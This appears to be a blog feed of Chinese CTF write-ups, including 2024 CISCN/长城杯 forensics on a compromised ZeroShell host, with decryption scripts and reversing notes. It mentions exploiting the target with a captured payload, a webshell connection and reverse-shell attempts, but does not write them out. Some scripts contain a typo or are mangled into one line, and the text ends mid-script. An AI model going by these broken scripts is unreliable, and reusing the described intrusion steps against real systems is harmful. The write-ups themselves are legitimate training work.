    <content type="html"><![CDATA[<h2 id="太极">太极</h2><p>给了提示</p><p>部分flag组成: wucup tieny-</p><p>太极生两仪-两仪生四象-四象生八卦-八卦定吉凶-吉凶生大业，可以看出是拼音，顺序取每个字的1，2，3，4，5个字母，超出长度的就取余得到flag</p><p>tieny-lieig-sieau-bunig-jieay</p><h2 id="原神启动">原神启动</h2><p>直接lsb拿到第一个压缩包密码</p><img src="/post/f409d317/IMAGE20241230235832286.png" class=""><p>解压拿到world，找到一个图片也有一段flag 在这个图片下面有隐藏的flag</p><img src="/post/f409d317/IMAGE20241230235844075.png" class="">之后解压压缩包即可拿到flag<h2 id="misc-签到">misc 签到</h2><p>直接cyberchef hex解密即可拿到flag</p><h2 id="旋转木马">旋转木马</h2><p>编写脚本53轮base64解密即可拿16进制的字符直接cyberchef解密得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;misc/flag1&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag1 = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;misc/flag2&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag2 = f.read()</span><br><span class="line"></span><br><span class="line">flag = flag1 + flag2</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        flag = base64.b64decode(flag)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Sign">Sign</h2><p>签到题，蚁剑连接即可</p><h2 id="Easy">Easy</h2><p>丢给gpt，直接出脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Flag.txt 中的密文</span></span><br><span class="line">flag_hex = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">d8d2 963e 0d8a b853 3d2a 7fe2 96c5 2923</span></span><br><span class="line"><span class="string">3924 6eba 0d29 2d57 5257 8359 322c 3a77</span></span><br><span class="line"><span class="string">892d fa72 61b8 4f</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 转换密文为字节数组</span></span><br><span class="line">ciphertext = <span class="built_in">bytes</span>.fromhex(flag_hex.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密钥</span></span><br><span class="line">key = <span class="string">b&quot;hello world&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化 S 和 T</span></span><br><span class="line">s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">t = [(key[i % <span class="built_in">len</span>(key)]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># KSA (Key Scheduling Algorithm)</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j = (j + s[i] + t[i]) % <span class="number">256</span></span><br><span class="line">    s[i], s[j] = s[j], s[i]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">i = j = <span class="number">0</span></span><br><span class="line">plaintext = <span class="built_in">bytearray</span>(<span class="built_in">len</span>(ciphertext))</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">    i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">    j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">    s[i], s[j] = s[j], s[i]</span><br><span class="line">    x = (s[i] + s[j]) % <span class="number">256</span></span><br><span class="line">    plaintext[m] = ciphertext[m] ^ s[x]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出明文</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted flag:&quot;</span>, plaintext.decode())</span><br></pre></td></tr></table></figure><h2 id="HotDog">HotDog</h2><p>进入程序后我们可以看见有按钮，所以我们用jadx逆向一下看看有没有onclick，来到onclick可以看见有verify函数</p><img src="/post/f409d317/IMAGE20241230235949597.png" class=""><p>但是verify里面是空的</p><img src="/post/f409d317/IMAGE20241230235957492.png" class=""><p>我们在另一个类里可以看见其引用类动态链接库，我们去动态链接库里看一看</p><img src="/post/f409d317/IMAGE20241231000004401.png" class=""><p>然后我们看一下so文件发现有个解密函数我们解密一下</p><img src="/post/f409d317/IMAGE20241231000012976.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">key1= <span class="number">0x7b</span></span><br><span class="line">key2= <span class="number">0xc2</span></span><br><span class="line">enc=[<span class="number">0x29</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xD5</span>, <span class="number">0xD1</span>, <span class="number">0xD1</span>, <span class="number">0xCD</span>, <span class="number">0xCA</span>, <span class="number">0x03</span>,</span><br><span class="line">  <span class="number">0x16</span>, <span class="number">0x16</span>, <span class="number">0xCD</span>, <span class="number">0xDC</span>, <span class="number">0xD7</span>, <span class="number">0x17</span>, <span class="number">0xCE</span>, <span class="number">0xD0</span>, <span class="number">0xDA</span>, <span class="number">0xD0</span>,</span><br><span class="line">  <span class="number">0xCD</span>, <span class="number">0x17</span>, <span class="number">0xDA</span>, <span class="number">0xD7</span>, <span class="number">0x16</span>, <span class="number">0xDA</span>, <span class="number">0xD5</span>, <span class="number">0xDC</span>, <span class="number">0xD9</span>, <span class="number">0xD9</span>,</span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0xD7</span>, <span class="number">0xDE</span>, <span class="number">0xE0</span>, <span class="number">0x16</span>, <span class="number">0xD5</span>, <span class="number">0xD6</span>, <span class="number">0xD1</span>, <span class="number">0xE1</span>, <span class="number">0xD6</span>,</span><br><span class="line">  <span class="number">0xDE</span>, <span class="number">0x17</span>, <span class="number">0xE1</span>, <span class="number">0xE0</span>, <span class="number">0xC5</span>, <span class="number">0x3D</span>]</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>,<span class="built_in">len</span>(enc)):</span><br><span class="line">  enc[i] = enc[i] - key2 ^ key1</span><br><span class="line">  <span class="keyword">if</span> enc[i]&lt; <span class="number">0</span>:</span><br><span class="line">    enc[i]+=<span class="number">256</span></span><br><span class="line">  enc[i]  = <span class="built_in">chr</span>(ennagc[i])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(enc[<span class="number">4</span>:]))</span><br></pre></td></tr></table></figure><p>解出来是一个网址，可以下载补全apk的dex文件，然后我们打开dex文件进行分析</p><p>在encryptCbc中，实现了3des加密，然后key和iv都是从data里面读取的。</p><img src="/post/f409d317/IMAGE20241231000026075.png" class=""><p>由于不清楚一段长数据如何转化为IV和key，所以直接把他代码拿来用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> WB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidAlgorithmParameterException;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</span><br><span class="line"><span class="keyword">import</span> java.security.Key;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.security.Security;</span><br><span class="line"><span class="keyword">import</span> java.security.spec.InvalidKeySpecException;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.InflaterInputStream;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKeyFactory;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.DESedeKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HotDog</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ALGORITHM_3DES</span> <span class="operator">=</span> <span class="string">&quot;DESEDE&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> IvParameterSpec IV_PARAMETER_SPEC;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Key <span class="title function_">keyGenerator</span><span class="params">(<span class="type">byte</span>[] bArr)</span> <span class="keyword">throws</span> InvalidKeyException, NoSuchAlgorithmException, InvalidKeySpecException &#123;</span><br><span class="line">        <span class="keyword">return</span> SecretKeyFactory.getInstance(ALGORITHM_3DES).generateSecret(<span class="keyword">new</span> <span class="title class_">DESedeKeySpec</span>(bArr));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">InflaterInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/Users/lemon/Desktop/pwn/pwn-enclosure/5-compi/WB/hotdog/data&quot;</span>)));</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.IV_PARAMETER_SPEC = <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>((<span class="type">byte</span>[]) objectInputStream.readObject());</span><br><span class="line">                System.out.println(Arrays.toString(<span class="built_in">this</span>.IV_PARAMETER_SPEC.getIV()));</span><br><span class="line">                System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="built_in">this</span>.encryptCbc((<span class="type">byte</span>[]) objectInputStream.readObject(), (<span class="type">byte</span>[]) objectInputStream.readObject(), Padding.PKCS5_PADDING)));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Padding</span> &#123;</span><br><span class="line">        NO_PADDING(<span class="string">&quot;NoPadding&quot;</span>),</span><br><span class="line">        PKCS5_PADDING(<span class="string">&quot;PKCS5Padding&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> String value;</span><br><span class="line"></span><br><span class="line">        Padding(String str) &#123;</span><br><span class="line">            <span class="built_in">this</span>.value = str;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] encryptCbc(<span class="type">byte</span>[] bArr, <span class="type">byte</span>[] bArr2, Padding padding) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Key</span> <span class="variable">keyGenerator</span> <span class="operator">=</span> keyGenerator(bArr);</span><br><span class="line">            <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;DESEDE/CBC/&quot;</span> + padding.value);</span><br><span class="line">            cipher.init(Cipher.DECRYPT_MODE, keyGenerator, <span class="built_in">this</span>.IV_PARAMETER_SPEC);</span><br><span class="line">            <span class="keyword">return</span> cipher.doFinal(bArr2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvalidAlgorithmParameterException unused) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Illegal algorithm parameter&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvalidKeyException unused2) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Invalid Key&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException unused3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;No such algorithm&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvalidKeySpecException unused4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Invalid key spec&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (BadPaddingException unused5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Bad padding&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalBlockSizeException unused6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Illegal block size&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchPaddingException unused7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;No such padding&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">HotDog</span> <span class="variable">hotDog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotDog</span>();</span><br><span class="line">        hotDog.test();</span><br><span class="line"><span class="comment">//        System.out.println(Arrays.toString(hotDog.IV_PARAMETER_SPEC.getIV()));</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/post/f409d317/IMAGE20241231000045162.png" class=""><h2 id="If-you-know">If you know</h2><p>程序有upx的壳，去壳后：</p><img src="/post/f409d317/IMAGE20241231000056029.png" class=""><p>在fini中有flag加密逻辑：</p><img src="/post/f409d317/IMAGE20241231000103891.png" class=""><p>加密2：</p><img src="/post/f409d317/IMAGE20241231000112426.png" class=""><p>加密1：</p><img src="/post/f409d317/IMAGE20241231000119846.png" class=""><p>简单的异或后偏移，解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">l = [</span><br><span class="line">    <span class="number">0xF5</span>, <span class="number">0x200</span>, <span class="number">0x208</span>, <span class="number">0x1EF</span>, <span class="number">0x235</span>, <span class="number">0x274</span>, <span class="number">0x23A</span>, <span class="number">0x276</span>, <span class="number">0x2B7</span>,</span><br><span class="line">    <span class="number">0x306</span>, <span class="number">0x2B2</span>, <span class="number">0x313</span>, <span class="number">0x2E2</span>, <span class="number">0x32F</span>, <span class="number">0x371</span>, <span class="number">0x440</span>, <span class="number">0x338</span>, <span class="number">0x3E9</span>,</span><br><span class="line">    <span class="number">0x3E2</span>, <span class="number">0x3B6</span>, <span class="number">0x407</span>, <span class="number">0x43E</span>, <span class="number">0x3BA</span>, <span class="number">0x3F4</span>, <span class="number">0x415</span>, <span class="number">0x473</span>, <span class="number">0x4DA</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">cipher</span>):</span><br><span class="line">    length = <span class="built_in">len</span>(cipher)</span><br><span class="line">    flag = [<span class="number">0</span>] * length</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        flag[idx] = cipher[idx]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(length)):</span><br><span class="line">        <span class="keyword">if</span> j % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">                flag[i] = flag[i] - (i + j + <span class="number">2</span>) ^ i</span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">                flag[i] = flag[i] - (i + j + <span class="number">1</span>) ^ i</span><br><span class="line"></span><br><span class="line">    flag_string = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(f) <span class="keyword">for</span> f <span class="keyword">in</span> flag)</span><br><span class="line">    <span class="keyword">return</span> flag_string</span><br><span class="line"></span><br><span class="line">flag = decrypt_flag(l)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><img src="/post/f409d317/IMAGE20241231000136277.png" class="">]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;太极&quot;&gt;太极&lt;/h2&gt;
&lt;p&gt;给了提示&lt;/p&gt;
&lt;p&gt;部分flag组成: wucup tieny-&lt;/p&gt;
&lt;p&gt;太极生两仪-两仪生四象-四象生八卦-八卦定吉凶-吉凶生大业，可以看出是拼音，顺序取每个字的1，2，3，4，5个字母，超出长度的就取余得到flag&lt;/p</summary>
      
    
    
    
    <category term="CTF" scheme="https://oceanzbz.github.io/categories/CTF/"/>
    
    
    <category term="CTFWP" scheme="https://oceanzbz.github.io/tags/CTFWP/"/>
    
  </entry>
  
  <entry>
    <title>2024Ciscn-长城杯Wp</title>
    <link href="https://oceanzbz.github.io/post/4051f994.html"/>
    <id>https://oceanzbz.github.io/post/4051f994.html</id>
    <published>2024-12-30T15:47:37.000Z</published>
    <updated>2025-03-05T07:24:36.804Z</updated>
    
    <content type="html"><![CDATA[<h2 id="威胁检测与网络流量分析">威胁检测与网络流量分析</h2><h3 id="zeroshell-1">zeroshell_1</h3><p>在流量的Referer里，CTF-NETA能秒</p><img src="/post/4051f994/IMAGE20241230234847797.png" class=""><h3 id="zeroshell-2">zeroshell_2</h3><p>用流量中的payload去打，flag在/Database里边</p><img src="/post/4051f994/IMAGE20241230234907953.png" class=""><h3 id="zeroshell-3">zeroshell_3</h3><p>从流量包里看的<br>ip.src=61…100</p><img src="/post/4051f994/IMAGE20241230234922784.png" class=""><p>连接的IP只有三个，128有登陆请求，所以还剩两个 都试试也能出，但是202的时间很规律，所以提交的202</p><h3 id="zeroshell-4">zeroshell_4</h3><p>shell一直弹不出来，不知道为什么 ｜ &amp; 都识别不了，编码也不行</p><p>执行netstat -anp 不断刷新能看到有202.115.89.103的连接，根据进程查到</p><p>Ls -al /proc/id/exe 能看到 连接到/tmp/.nginx</p><img src="/post/4051f994/IMAGE20241230234945300.png" class=""><h3 id="zeroshell-5">zeroshell_5</h3><img src="/post/4051f994/IMAGE20241230234958471.png" class=""><p>使用xxd -p以16进制形式导出 然后存为elf文件用ida打开</p><p>shift+f12定位字符串，查找发现一个比较像key的11223344qweasdzxc，包上flag提交正确。</p><img src="/post/4051f994/IMAGE20241230235013126.png" class=""><h3 id="zeroshell-6">zeroshell_6</h3><img src="/post/4051f994/IMAGE20241230235024086.png" class=""><p>用qemu-img转一下，用DiskGeniux挂上，再把文件导出来</p><img src="/post/4051f994/IMAGE20241230235031113.png" class=""><p>用Sublime.txt搜一下</p><img src="/post/4051f994/IMAGE20241230235039272.png" class=""><p>flag{/var/register/system/startup/scripts/nat/File}</p><h3 id="Win-FT1">Win_FT1</h3><p>打开之后用虚拟机自带的</p><img src="/post/4051f994/IMAGE20241230235053509.png" class=""><p>flag{<a href="http://miscsecure.com">miscsecure.com</a>:192.168.116.130:443}</p><h3 id="Win-FT2">Win_FT2</h3><p>也是自带PCHunter，在启动项那里看计划任务</p><img src="/post/4051f994/IMAGE20241230235108297.png" class=""><p>最下面有flag，在base解码出来</p><h3 id="WinFT-5">WinFT_5</h3><p>用ctf-neta能跑出来两个zip，但是格式不对，去wireshark流量看导出http对象，全部导出来，一个是不完整的PK头，另一个也有PK，拼接打开，注释解码就是密码</p><img src="/post/4051f994/IMAGE20241230235125784.png" class=""><img src="/post/4051f994/IMAGE20241230235159219.png" class=""><img src="/post/4051f994/IMAGE20241230235204456.png" class=""><h3 id="sc05-1">sc05_1</h3><p>看tcp</p><img src="/post/4051f994/IMAGE20241230235216129.png" class=""><p>这个就是，空格转_再转md5再大写</p><h2 id="re">re</h2><h3 id="ezCsky">ezCsky</h3><p>根据提示mips，idamips架构打开</p><p>发现标准的rc4加密和异或操作，写脚本逆出来就是flag。</p><img src="/post/4051f994/IMAGE20241230235230180.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">_<span class="comment"># 定义密钥和密文（密文以十六进制形式表示）_ key = b&quot;testkey&quot; ciphertext_hex = [ 0x96, 0x8F, 0xB8, 0x08, 0x5D, 0xA7, 0x68, 0x44, 0xF2, 0x64, 0x92, 0x64, 0x42, 0x7A, 0x78, 0xE6, 0xEA, 0xC2, 0x78, 0xB8, 0x63, 0x9E, 0x5B, 0x3D, 0xD9, 0x28, 0x3F, 0xC8, 0x73, 0x06, 0xEE, 0x6B, 0x8D, 0x0C, 0x4B, 0xA3, 0x23, 0xAE, 0xCA, 0x40, 0xED, 0xD1 ] _# 使用给定密钥初始化RC4解密器_ cipher = ARC4.new(key) _# 解密密文_ plaintext = cipher.decrypt(bytes(ciphertext_hex)) plaintext=bytearray(plaintext) for i in range(len(plaintext)-1,0,-1): plaintext[i-1]^=plaintext[i] _# 打印解密后的明文_ print(plaintext)</span></span><br><span class="line"></span><br><span class="line">![](https://uik4u42yzi.feishu.cn/space/api/box/stream/download/asynccode/?code=NDY3ZGI2MDZhOWJiYzQxNTdiNTQxZmVmMDY2ZDkxYzVfV1NHbU5jT2pqRWhudGNBMmZIVTRzQjBsdkVuaWRBOW9fVG9rZW46UjFjUmJRQWdEbzVlWm14eVcwNGN3NGtFblJmXzE3MzU1NzM5NTY6MTczNTU3NzU1Nl9WNA)</span><br></pre></td></tr></table></figure><img src="/post/4051f994/IMAGE20241230235300026.png" class=""><h3 id="Dump">Dump</h3><p>纸老虎，打开发现加密逻辑特别复杂，但是动调时候发现是单个字符替换，所以直接试出来所有的map组合之后读取flag文件进行替换即可。</p><img src="/post/4051f994/IMAGE20241230235325754.png" class=""><img src="/post/4051f994/IMAGE20241230235330123.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">mapp = &#123;</span><br><span class="line"></span><br><span class="line"><span class="number">0x1c</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">0x1d</span>: <span class="string">&#x27;2&#x27;</span>, <span class="number">0x01</span>: <span class="string">&#x27;=&#x27;</span>, <span class="number">0x02</span>: <span class="string">&#x27;A&#x27;</span>, <span class="number">0x03</span>: <span class="string">&#x27;B&#x27;</span>, <span class="number">0x04</span>: <span class="string">&#x27;C&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x05</span>: <span class="string">&#x27;D&#x27;</span>, <span class="number">0x06</span>: <span 